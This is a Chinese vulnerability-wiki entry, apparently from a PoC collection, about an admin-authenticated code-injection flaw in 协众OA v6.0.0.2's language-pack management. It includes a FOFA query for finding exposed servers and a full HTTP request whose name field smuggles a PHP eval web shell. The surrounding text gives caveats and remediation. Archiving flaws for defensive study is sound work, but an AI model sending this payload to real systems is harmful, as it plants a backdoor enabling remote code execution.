---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "协众OA 语言包写入PHP代码"
product: "协众OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "v6.0.0.2；语言包名称写入可执行PHP"
prerequisites: "后台管理员明确"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E5%8D%8F%E4%BC%97OA/%E5%8D%8F%E4%BC%97oa-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"协众软件-协众OA\""
id: "vw-d9233765b6117a9434e2df2a"
entity_id: "ve-d9233765b6117a9434e2df2a"
schema_version: "1"
---

# 协众OA 语言包写入PHP代码

## 条目说明

- 对象与具体问题：协众OA；语言包写入PHP代码
- 版本、配置及部署条件：v6.0.0.2；语言包名称写入可执行PHP
- 认证与权限前提：后台管理员明确
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 攻击流程只给修改请求，执行/触发位置及落地文件缺文本说明
- POC/EXP星号为模板噪声
- 在野利用/广影响结论无独立证据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

过后台管理员用户进入系统后，在系统设置⇒语言包管理功能中，添加语言功能存在任意代码写入漏洞；添加语言功能，直接写入恶意代码

## 影响版本

协众oa_v6.0.0.2

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="协众软件-协众OA"

POC/EXP：****

```http
POST /index.php?app=main&func=system&action=language&task=editLanguage HTTP/1.1
Host: 192.168.31.105:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 84
Origin: http://192.168.31.105:81
Connection: close
Referer: http://192.168.31.105:81/index.php
Cookie: CNOAOASESSID=uaj6jn0vojvh969ifeg0pa0de9; CNOA_language=cn; CNOA_NY_KEY=356961; CNOA_LOGIN_USERNAME=czo1OiJhZG1pbiI7; SECKEY_ABVK=/420bq5LeWyiFjJwZBYhJUs0O9885JC+Hd3fRVGJFbc%3D; BMAP_SECKEY=41sAeDfHudS5GjbYSnCXMeNNGuF959mefSOfp7Q1BW-zmQLRDmZItO3r-vrtElKNrWcdKRzkMBtKmXskKosF1X5lBthRP4xgKXOf0aYSPx2b8f7GzDtdT2HYmOpB-v-oG0-tAmDPNy9dgxx34xryXMc-xflZJUjxr9fsdkzIsm9UfebGh-0URztMUHwuDzDOiNee0PzYZjfXeqOsRHtN0A; ys-CNOA_main_user_index_treeState=s%3A
X-Forwarded-For: 127.0.0.1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0

id=3&cnoanykey=356961&name=%E4%BF%84%E8%AF%AD';//%0a@eval($_POST[1]);%0a//&status=on

```

> 请求长度说明：原资料 Content-Length 为 84；保留原始标头；其数值未据实际请求体重新计算或验证。

![image-20250314132421652](./.resource/协众oa-后台存在任意代码注入漏洞/media/image-20250314132421652.png)


![image-20250314132519770](./.resource/协众oa-后台存在任意代码注入漏洞/media/image-20250314132519770.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
